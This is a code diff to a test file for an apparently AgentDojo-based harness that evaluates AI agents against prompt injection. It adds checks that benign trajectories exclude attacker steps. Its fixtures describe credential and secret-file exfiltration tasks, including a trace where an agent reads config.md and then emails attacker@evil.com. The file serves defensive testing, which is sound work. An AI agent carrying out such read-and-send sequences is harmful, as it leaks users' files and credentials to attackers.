@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest';
-import { declaredTrajectoryCalls, parseToolPlan, riskForTool } from '../scripts/agentdojo-real/model-in-loop';
-import type { Task } from '../scripts/agentdojo-real/suite';
+import { declaredTrajectoryCalls, parseToolPlan, riskForTool, validateTaskFixtures } from '../scripts/agentdojo-real/model-in-loop';
+import { SUITE, type Task } from '../scripts/agentdojo-real/suite';
 
 describe('model-in-the-loop evaluation plan parser', () => {
   it('classifies read-only SQL separately from destructive SQL', () => {
@@ -28,16 +28,29 @@ describe('model-in-the-loop evaluation plan parser', () => {
     const control = {
       attackExpected: false,
       susceptibleTrace: [{ name: 'send_email', arguments: { to: 'boss@company.com' } }],
-    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
+    } as Pick<Task, 'attackExpected' | 'benignTraceLength' | 'susceptibleTrace'>;
     const attack = {
       attackExpected: true,
       susceptibleTrace: [
         { name: 'read_file', arguments: { path: 'config.md' } },
         { name: 'send_email', arguments: { to: 'attacker@evil.com' } },
       ],
-    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
+    } as Pick<Task, 'attackExpected' | 'benignTraceLength' | 'susceptibleTrace'>;
     expect(declaredTrajectoryCalls(control)).toEqual(control.susceptibleTrace);
     expect(declaredTrajectoryCalls(attack)).toEqual([attack.susceptibleTrace[0]]);
+  });
+
+  it('does not authorize multi-step attacker suffixes in the declared benign trajectory', () => {
+    const credentialExfil = SUITE.find(task => task.id === 'workspace_credential_exfil');
+    const secretFileExfil = SUITE.find(task => task.id === 'workspace_secret_file_exfil');
+    expect(credentialExfil).toBeDefined();
+    expect(secretFileExfil).toBeDefined();
+    expect(declaredTrajectoryCalls(credentialExfil!)).toEqual(credentialExfil!.susceptibleTrace.slice(0, 2));
+    expect(declaredTrajectoryCalls(secretFileExfil!)).toEqual(secretFileExfil!.susceptibleTrace.slice(0, 1));
+  });
+
+  it('validates that every authored susceptible trace reaches its expected outcome', () => {
+    expect(validateTaskFixtures(SUITE)).toEqual([]);
   });
 
   it('rejects prose, malformed calls, and oversized plans', () => {
